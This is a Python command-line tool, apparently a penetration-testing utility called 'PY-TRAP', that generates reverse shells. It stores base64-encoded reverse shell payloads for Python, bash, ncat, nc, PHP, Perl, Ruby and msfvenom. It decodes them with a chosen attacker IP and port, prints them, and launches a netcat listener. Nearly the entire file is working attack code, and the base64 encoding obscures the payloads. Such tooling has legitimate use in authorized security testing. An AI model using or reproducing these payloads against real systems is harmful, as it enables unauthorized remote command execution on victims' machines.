#!/usr/bin/python3
# coding=utf-8
import requests
import subprocess
import base64
import sys
from termcolor import colored

#payload dictonary
shells = {
    
    "python" : ["aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoInlvdXJfaXAiLHlvdXJfcG9ydCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCg==","cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgieW91cl9pcCIseW91cl9wb3J0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnCg==","cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgieW91cl9pcCIseW91cl9wb3J0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIiknCg=="],
    "python3" : ["aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoInlvdXJfaXAiLHlvdXJfcG9ydCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pCg==","cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInlvdXJfaXAiLHlvdXJfcG9ydCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jwo="],
    "bash" : ["YmFzaCAtaSA+JiAvZGV2L3RjcC95b3VyX2lwL3lvdXJfcG9ydCAwPiYxCg=="],
    "ncat" : ["bmNhdCB5b3VyX2lwIHlvdXJfcG9ydCAtZSAvYmluL2Jhc2gK","bmNhdCAtLXVkcCB5b3VyX2lwIHlvdXJfcG9ydCAtZSAvYmluL2Jhc2gK"],
    "nc" : ["bmMgLWUgL2Jpbi9zaCB5b3VyX2lwIHlvdXJfcG9ydAo=","bmMgeW91cl9pcCB5b3VyX3BvcnQgLWUgYmFzaAo=","cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZiB8IC9iaW4vc2ggLWkgMj4mMSB8IG5jIHlvdXJfaXAgeW91cl9wb3J0ID4vdG1wL2YK"],
    "php" : ["PD9waHAKc2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAneW91cl9pcCc7ICAKJHBvcnQgPSB5b3VyX3BvcnQ7ICAgICAgIAokY2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewogICAgICAgIC8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKICAgICAgICAkcGlkID0gcGNudGxfZm9yaygpOwogICAgICAgIGlmICgkcGlkID09IC0xKSB7CiAgICAgICAgICAgICAgICBwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwogICAgICAgICAgICAgICAgZXhpdCgxKTsKICAgICAgICB9CiAgICAgICAgaWYgKCRwaWQpIHsKICAgICAgICAgICAgICAgIGV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKICAgICAgICB9CiAgICAgICAgaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CiAgICAgICAgICAgICAgICBwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKICAgICAgICAgICAgICAgIGV4aXQoMSk7CiAgICAgICAgfQogICAgICAgICRkYWVtb24gPSAxOwp9IGVsc2UgewogICAgICAgIHByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CmNoZGlyKCIvIik7CnVtYXNrKDApOwokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewogICAgICAgIHByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKICAgICAgICBleGl0KDEpOwp9CiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKICAgICAgICBwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsKICAgICAgICBleGl0KDEpOwp9CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7CndoaWxlICgxKSB7CiAgICAgICAgaWYgKGZlb2YoJHNvY2spKSB7CiAgICAgICAgICAgICAgICBwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5hdGVkIik7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgaWYgKGZlb2YoJHBpcGVzWzFdKSkgewogICAgICAgICAgICAgICAgcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgICRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwogICAgICAgICRudW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVycm9yX2EsIG51bGwpOwogICAgICAgIGlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwogICAgICAgICAgICAgICAgJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwogICAgICAgICAgICAgICAgZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKICAgICAgICB9CiAgICAgICAgaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVCBSRUFEIik7CiAgICAgICAgICAgICAgICAkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKICAgICAgICAgICAgICAgIGlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7CiAgICAgICAgICAgICAgICBmd3JpdGUoJHNvY2ssICRpbnB1dCk7CiAgICAgICAgfQogICAgICAgIGlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7CiAgICAgICAgICAgICAgICBpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwogICAgICAgICAgICAgICAgJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CiAgICAgICAgICAgICAgICBpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwogICAgICAgICAgICAgICAgZndyaXRlKCRzb2NrLCAkaW5wdXQpOwogICAgICAgIH0KfQpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewogICAgICAgIGlmICghJGRhZW1vbikgewogICAgICAgICAgICAgICAgcHJpbnQgIiRzdHJpbmdcbiI7CiAgICAgICAgfQp9Cj8+Cg==","PD9waHAKICAgIHN5c3RlbSgncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgeW91cl9pcCB5b3VyX3BvcnQgPi90bXAvZicpOwo/Pgo=","PD9waHAKICAgIGV4ZWMoIi9iaW4vYmFzaCAtYyAnYmFzaCAtaSA+IC9kZXYvdGNwL3lvdXJfaXAveW91cl9wb3J0IDA+JjEnIik7Cj8+Cg=="],
    "perl":["cGVybCAtZSAndXNlIFNvY2tldDskaT0ieW91cl9pcCI7JHA9eW91cl9wb3J0O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycK","dXNlIFNvY2tldAoKJGk9InlvdXJfaXAiOwokcD15b3VyX3BvcnQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpOwppZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXsKICAgIG9wZW4oU1RESU4sIj4mUyIpOwogICAgb3BlbihTVERPVVQsIj4mUyIpOwogICAgb3BlbihTVERFUlIsIj4mUyIpOwogICAgZXhlYygiL2Jpbi9zaCAtaSIpOwp9Cg=="],
    "ruby": ["cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygieW91cl9pcCIseW91cl9wb3J0KTt3aGlsZShjbWQ9Yy5nZXRzKTtJTy5wb3BlbihjbWQsInIiKXt8aW98Yy5wcmludCBpby5yZWFkfWVuZCcK","cmVxdWlyZSAnc29ja2V0JwoKYz1UQ1BTb2NrZXQubmV3KCJ5b3VyX2lwIix5b3VyX3BvcnQpCgp3aGlsZShjbWQ9Yy5nZXRzKQogICAgSU8ucG9wZW4oY21kLCJyIil7CiAgICAgICAgfGlvfGMucHJpbnQgaW8ucmVhZAogICAgfQplbmQK"],
    "msfvenom" : ["bXNmdmVub20gLXAgd2luZG93cy94NjQvc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9eW91cl9pcCBMUE9SVD15b3VyX3BvcnQgLWYgZXhlIC1vIHNoZWxsLmV4ZQo=","bXNmdmVub20gLXAgd2luZG93cy94NjQvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3AgTEhPU1Q9eW91cl9pcCBMUE9SVD15b3VyX3BvcnQgLWYgZXhlIC1vIHNoZWxsLmV4ZQo=","bXNmdmVub20gLXAgd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcCBMSE9TVD15b3VyX2lwIExQT1JUPXlvdXJfcG9ydCAtZiBleGUgLW8gc2hlbGwuZXhlCg==","bXNmdmVub20gLXAgd2luZG93cy9zaGVsbC9yZXZlcnNlX3RjcCBMSE9TVD15b3VyX2lwIExQT1JUPXlvdXJfcG9ydCAtZiBleGUgLW8gc2hlbGwuZXhlCg=="],

}



#function for decode 
def decode():     

    shell_type = sys.argv[1]
    ip_addr = sys.argv[2]
    port_number = sys.argv[3]
    count=0

    for payload in shells:
        if payload == shell_type:
            for i in shells[payload]:
                count+=1
                print("\033[1;92m"+"[*] type:"+str(count)+"\n")
                dcode = base64.b64decode(i).decode('utf-8')
                R_ip = dcode.replace("your_ip",ip_addr)
                R_port = R_ip.replace("your_port",port_number)
                print(colored(R_port,"white",attrs=['bold']))


#banner
def banner():
        print("")
print(colored("       ___ __","blue"))
print(colored("     _{___{__}\ ","blue"))
print(colored("    {_}      `\) ","blue"))
print(colored("   {_}        `            _.-'''--.._  ","blue"))
print(colored("   {_}                    //'.--.  \___`.  ","blue"))
print(colored("    { }__,_.--~~~-~~~-~~-::.---. `-.\  `.)  ","blue"))
print(colored("     `-.{_{_{_{_{_{_{_{_//  -- 8;=- `  ","blue"))
print(colored("        `-:,_.:,_:,_:,.`\\._ ..'=- ,  ","blue"))
print(colored("            // // // //`-.`\`   .-'/ ","blue"))
print(colored("           << << << <<    \ `--'  /----) ","blue"))
print(colored("            ^  ^  ^  ^     `-.....--''' ","blue"))

print("██████╗ ██╗   ██╗  ████████╗██████╗  █████╗ ██████╗")
print("██╔══██╗╚██╗ ██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗")
print("██████╔╝ ╚████╔╝█████╗██║   ██████╔╝███████║██████╔╝")
print("██╔═══╝   ╚██╔╝ ╚════╝██║   ██╔══██╗██╔══██║██╔═══╝")
print("██║        ██║        ██║   ██║  ██║██║  ██║██║")
print("╚═╝        ╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝")
print(colored("By Anant","cyan",attrs=['reverse','blink']))

#main
if __name__ == "__main__":
    
    if len(sys.argv)==1:
        banner()
        print("\033[1m"+"\033[91m"+"\n [-] You have to choose a option from the list: \n")
        print("\033[1m"+"\033[97m"+" python \n python3 \n bash \n ncat \n nc \n php \n perl  \n ruby \n msfvenom \n")
        print("\033[93m"+"\033[1m"+"[+] Example: python3 %s <shell> <LHOST> <LPORT>"%sys.argv[0])
        sys.exit(1)

    if len(sys.argv)==2:
        banner()
        print("\033[1m"+"\033[91m"+"\n[-] May be you did not enter IP address and Port number : \n ")
        print('')
        print("\033[93m"+"\033[1m"+"[+] Example: %s <shell> <LHOST> <LPORT>"%sys.argv[0])
        sys.exit(1)

    if len(sys.argv)==3:
        banner()
        print("\033[1m"+"\033[91m"+"\n[-] May be you did not enter port number [LPORT]: \n")
        print('')
        print("\033[1m"+"\033[93m"+"[+] Example: %s <shell> <LHOST> <LPORT>"%sys.argv[0])
        sys.exit(1)

    banner()
         
    decode()
    print(colored("-"*63+"[listening start on"+" --> "+ str(sys.argv[2])+":" + str(sys.argv[3])+"]"+"-"*63,"yellow",attrs=['bold']))
    print('\n')
    subprocess.run(["/usr/bin/nc","-lvnp",sys.argv[3]])

